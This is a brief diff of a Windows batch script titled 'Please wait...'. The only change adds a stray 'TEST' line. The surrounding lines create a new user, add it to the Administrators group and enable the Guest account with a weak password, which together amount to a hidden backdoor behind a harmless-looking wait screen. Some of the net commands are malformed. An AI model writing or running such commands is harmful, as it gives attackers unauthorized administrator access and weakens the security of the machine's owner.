@@ -1,6 +1,7 @@
 echo off
 title Please wait...
 cls
+TEST
 net user add Username Password /add
 net user localgroup Administrators Username /add
 net user Guest 420 /active:yes
